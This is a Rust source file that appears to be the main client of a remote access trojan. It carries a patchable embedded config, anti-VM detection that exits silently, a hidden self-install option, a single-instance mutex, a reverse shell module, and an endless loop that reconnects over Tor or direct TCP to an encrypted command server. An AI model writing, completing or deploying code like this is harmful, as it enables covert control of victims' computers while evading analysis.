// #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
// #![cfg_attr(debug_assertions, windows_subsystem = "windows")]

#[no_mangle]
#[link_section = ".zzz"]
static CONFIG: [u8; 1024] = [0; 1024];

use std::time::Duration;
use winapi::um::winuser::SetProcessDPIAware;

pub mod features;
pub mod service;
pub mod handler;

use tokio::{io::AsyncRead, io::AsyncWrite, net::TcpStream, sync::oneshot, time::sleep};
use arti_client::{TorClient, TorClientConfig};
use common::{connection::Connection, connection::StreamTrait, packets::*};

use std::sync::{Arc, Mutex};
use once_cell::sync::Lazy;

use features::encryption;

static MUTEX_SERVICE: Lazy<Mutex<service::mutex::MutexLock>> = Lazy::new(||
    Mutex::new(service::mutex::MutexLock::new())
);

static REVERSE_SHELL: Lazy<Mutex<features::reverse_shell::ReverseShell>> = Lazy::new(||
    Mutex::new(features::reverse_shell::ReverseShell::new())
);

#[tokio::main(flavor = "current_thread")]
async fn main() {
    let config = service::config::get_config();

    if config.anti_vm_detection && service::anti_vm::anti_vm_detection() {
        std::process::exit(0);
    }

    let tray_icon = Arc::new(Mutex::new(service::tray_icon::TrayIcon::new()));
    
    {
        tray_icon.lock().unwrap().set_unattended(config.unattended_mode);
        tray_icon.lock().unwrap().show();
    }

    unsafe {
        // FIX REMOTE DESKTOP DPI ISSUES
        SetProcessDPIAware();
    }

    {
        // MUTEX SERVICE
        let mut mutex_lock_guard = MUTEX_SERVICE.lock().unwrap();
        mutex_lock_guard.init(config.mutex_enabled, config.mutex.clone());
    }

    if config.install {
        service::install::install(config.install_folder.clone(), config.file_name.clone(), config.enable_hidden);
    }


    let tor_client = if config.use_tor {
        println!("Initializing Tor client...");
        let tor_config = TorClientConfig::default();
        match TorClient::create_bootstrapped(tor_config).await {
            Ok(client) => Some(client),
            Err(e) => {
                eprintln!("Failed to create Tor client: {}. Falling back to direct connection or retrying.", e);
                None
            }
        }
    } else {
        None
    };

    // Main connection loop
    loop {
        let tray_icon_clone = tray_icon.clone();
        // Connect to server phase
        println!("Connecting to server...");

        {
            tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Connecting...");
        }
        
        let stream = if config.use_tor && tor_client.is_some() {
            let tor = tor_client.as_ref().unwrap();
            let port = config.port.parse::<u16>().unwrap_or(1337);
            match tor.connect((config.tor_address.clone(), port)).await {
                Ok(s) => Box::new(s) as Box<dyn StreamTrait + Unpin + Send>,
                Err(e) => {
                    println!("Tor connection failed for {}:{}: {}. Falling back to direct TCP...", config.tor_address, port, e);
                    match TcpStream::connect(format!("{}:{}", config.ip, config.port)).await {
                        Ok(socket) => Box::new(socket) as Box<dyn StreamTrait + Unpin + Send>,
                        Err(e) => {
                            println!("Direct connection failed after Tor failure: {}. Retrying in 5 seconds...", e);
                            sleep(Duration::from_secs(5)).await;
                            continue;
                        }
                    }
                }
            }
        } else {
            if config.use_tor {
                println!("Tor client not available, attempting direct connection to {}:{}", config.ip, config.port);
            }
            match TcpStream::connect(format!("{}:{}", config.ip, config.port)).await {
                Ok(socket) => Box::new(socket) as Box<dyn StreamTrait + Unpin + Send>,
                Err(e) => {
                    println!("Connection failed: {}. Retrying in 5 seconds...", e);
                    sleep(Duration::from_secs(5)).await;
                    continue;
                }
            }
        };

        {
            tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Connected");
        }

        // Encryption handshake phase
        println!("Connected to server. Performing encryption handshake...");
        let connection = Connection::<ClientboundPacket, ServerboundPacket>::new_from_boxed(stream);
        
        let encryption_result = encryption::perform_encryption_handshake(connection).await;
        
        match encryption_result {
            Ok((encryption_state, reader, writer)) => {
                // println!("Encryption handshake successful!");
                // Setup communication channel between reader and writer
                let (tx, rx) = oneshot::channel::<()>();

                // Start writer task
                let write_task = tokio::spawn(
                    handler::writing_loop(
                        writer, 
                        rx, 
                        encryption_state.secret.clone(), 
                        encryption_state.nonce_generator_write
                    )
                );
                
                // Small delay to ensure writer is ready
                sleep(Duration::from_millis(100)).await;
                
                // Start reader task (will block until connection ends)
                handler::reading_loop(
                    reader, 
                    tx, 
                    encryption_state.secret.clone(), 
                    encryption_state.nonce_generator_read
                ).await;
                
                // Wait for writer to complete
                if let Err(e) = write_task.await {
                    println!("Write task error: {}", e);
                }

                {
                    tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Disconnected");
                }
                
                // println!("Connection ended. Reconnecting in 5 seconds...");
                sleep(Duration::from_secs(5)).await;
            },
            Err(_) => {
                {
                    tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Disconnected");
                }

                // println!("Encryption handshake failed: {}. Retrying in 5 seconds...", e);
                sleep(Duration::from_secs(5)).await;
            }
        }
    }
}